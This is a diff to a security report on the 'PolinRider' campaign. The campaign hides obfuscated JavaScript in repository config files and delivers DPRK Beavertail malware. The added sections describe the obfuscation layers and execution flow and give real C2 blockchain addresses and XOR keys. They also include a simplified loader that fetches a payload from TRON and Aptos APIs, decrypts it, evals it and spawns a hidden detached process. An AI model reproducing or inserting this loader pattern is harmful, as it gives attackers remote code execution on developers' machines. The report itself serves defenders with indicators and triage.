@@ -34,6 +34,39 @@ This campaign is growing quickly with the total number of compromised repositori
 
 ---
 
+## Malware Summary
+
+PolinRider ultimately delivers a new version of the DPRK Beavertail malware. The initial payload is a mass-compromise backdoor/infostealer that injects an identical obfuscated JavaScript payload into legitimate developers' repositories. The payload is appended after whitespace padding to common config files (postcss.config.mjs, eslint.config.mjs, tailwind.config.js, etc.) so it executes automatically when build tools import the module. It uses a multi-layer string shuffling deobfuscation routine with the unique signature ("rmcej%otb%",2857687) and function name _$_1e42, ultimately constructing and eval'ing the final payload at runtime.
+
+This final payload is a sophisticated **blockchain-based dead drop resolver** that uses immutable blockchain transactions as Command & Control (C2) infrastructure. The malware fetches encrypted JavaScript payloads from blockchain accounts (TRON, Aptos, and BSC), decrypts them using XOR encryption, and executes them via `eval()`. This technique makes the C2 infrastructure virtually impossible to take down since blockchain data is immutable.
+
+---
+
+## What Does It Do?
+
+### Primary Functionality
+
+1. **Blockchain-Based C2 Communication**
+   - Queries TRON blockchain accounts for transaction data
+   - Falls back to Aptos blockchain if TRON fails
+   - Can query Binance Smart Chain (BSC) transactions
+   - Retrieves encrypted JavaScript payloads from blockchain transactions
+
+2. **Payload Decryption**
+   - Uses XOR cipher with hardcoded keys to decrypt payloads
+   - Two different XOR keys for different stages/fallbacks
+
+3. **Remote Code Execution**
+   - Executes decrypted code via `eval()`
+   - Spawns detached child processes for persistence
+   - Code execution happens with no user interaction
+
+4. **Anti-Analysis Features**
+   - Multiple layers of obfuscation (4+ layers)
+   - String encryption and character substitution
+   - Dead drop resolver technique (hard to attribute)
+   - Detached process execution (survives parent termination)
+
 ### List of Compromised Repositories
 
 | #   | Repository                                                             | Owner                         | Owner Type   | Stars | Forks | Infected Files | File Paths                                                                                                                                                                                                                                                    | Description                                                                                                                                                                                                                                                                                                                                               | Repo URL                                                                                  |
@@ -737,24 +770,120 @@ The full CSVs are sorted by impact for triage.
 
 ---
 
-## Indicators of Compromise (IOCs)
+## Malware Technical Analysis
 
-### Static Signatures
+### Obfuscation Layers
 
-| Type | Value |
-|------|-------|
-| String marker | `rmcej%otb%` |
-| Global alias | `global['!']='4-1422'` |
-| Cipher seed 1 | `2857687` |
-| Cipher seed 2 | `2667686` |
-| Variable prefix | `_$_1e42` |
+The malware uses 4 layers of obfuscation:
 
-### Behavioural Indicators
+1. **Layer 1:** Character swap algorithm with seed `2857687`
+   - Deobfuscates to array: `['r', 'object', 'm']` (require, typeof check, module)
 
-- `require` aliased to `global['!']` at runtime
-- `Function()` called with dynamically constructed string argument
-- Config files contain content after `export default` / `module.exports`
-- Large horizontal whitespace block (100+ spaces) before injected payload
+2. **Layer 2:** Character swap with seed `2667686`
+   - Deobfuscates function names and string constants
+   - Reveals the decoder function code
+
+3. **Layer 3:** Custom substitution cipher
+   - Character mapping using special codes
+   - Replaces placeholders like `.c`, `.a`, etc. with actual characters
+   - Character codes: `\`, `` ` ``, space, newline, `*`, `'`, and more
+
+4. **Layer 4:** XOR encryption for final payloads
+   - Payloads retrieved from blockchain are XOR-encrypted
+   - Two hardcoded keys for different stages
+
+### Execution Flow
+
+```
+1. Malware loads when NPM package is imported
+2. Deobfuscates internal strings and function names
+3. Queries TRON blockchain account for latest transaction
+   ├─ URL: https://api.trongrid.io/v1/accounts/TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP/transactions
+   └─ Extracts transaction data containing encrypted payload
+4. If TRON fails, queries Aptos blockchain
+   ├─ URL: https://fullnode.mainnet.aptoslabs.com/v1/accounts/0xbe037.../transactions
+   └─ Extracts payload from transaction arguments
+5. XOR-decrypts the payload using key "2[gWfGj;<:-93Z^C"
+6. Executes decrypted code via eval()
+7. Spawns detached child process for persistence
+   ├─ Command: node -e "<malicious code>"
+   └─ Detached: true, windowsHide: true
+8. If first set fails, repeats with secondary addresses and key
+```
+
+### Code Structure
+
+```javascript
+// Simplified structure (actual code is heavily obfuscated)
+
+async function fetchPayloadFromTron(address) {
+    // Queries TRON API for account transactions
+    const response = await https.get(
+        `https://api.trongrid.io/v1/accounts/${address}/transactions?only_confirmed=true&only_from=true&limit=1`
+    );
+    // Extracts encrypted data from transaction
+    return response.data[0].raw_data.data;
+}
+
+async function fetchPayloadFromAptos(txHash) {
+    // Queries Aptos API for transaction details
+    const response = await https.get(
+        `https://fullnode.mainnet.aptoslabs.com/v1/accounts/${txHash}/transactions?limit=1`
+    );
+    // Extracts payload from transaction arguments
+    return response[0].payload.arguments[0];
+}
+
+function xorDecrypt(encryptedData, key) {
+    // XOR decryption with repeating key
+    let result = '';
+    for (let i = 0; i < encryptedData.length; i++) {
+        const keyChar = key.charCodeAt(i % key.length);
+        result += String.fromCharCode(encryptedData.charCodeAt(i) ^ keyChar);
+    }
+    return result;
+}
+
+// Main execution
+const encryptedPayload = await fetchPayloadFromTron("TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP");
+const decryptedCode = xorDecrypt(encryptedPayload, "2[gWfGj;<:-93Z^C");
+eval(decryptedCode);  // EXECUTES ARBITRARY CODE
+
+// Persistence via detached child process
+require('child_process').spawn('node', ['-e', `global['_V']='...'${decryptedCode}`], {
+    detached: true,
+    stdio: 'ignore',
+    windowsHide: true
+});
+```
+
+---
+
+## C2 Infrastructure (Indicators of Compromise)
+
+### Blockchain Addresses
+
+#### TRON Addresses (Primary C2)
+- **`TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP`** (Primary)
+- **`TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG`** (Secondary)
+
+API Endpoint: `https://api.trongrid.io/v1/accounts/`
+
+#### Aptos Transaction Hashes (Fallback C2)
+- **`0xbe037400670fbf1c32364f762975908dc43eeb38759263e7dfcdabc76380811e`** (Primary)
+- **`0x3f0e5781d0855fb460661ac63257376db1941b2bb522499e4757ecb3ebd5dce3`** (Secondary)
+
+API Endpoint: `https://fullnode.mainnet.aptoslabs.com/v1/accounts/`
+
+#### BSC RPC Nodes
+- `bsc-dataseed.binance.org`
+- `bsc-rpc.publicnode.com`
+
+Method: `eth_getTransactionByHash`
+
+### XOR Decryption Keys
+- **Primary Key:** `2[gWfGj;<:-93Z^C`
+- **Secondary Key:** `m6:tTh^D)cBz?NM]`
 
 ### YARA Rule (Suggested)
 
@@ -817,7 +946,7 @@ Data was collected using the GitHub Code Search API via `gh search code`, runnin
 
 | File | Description |
 |------|-------------|
-| `rmcej-otb-threat-report.md` | This report |
+| `README.md` | This report |
 | `affected_repos.csv` | All 565 affected repositories — organisations first, then users, each sorted by stars+forks descending |
 | `affected_users.csv` | All 303 affected owners — organisations first, then users, each sorted by followers descending |
 
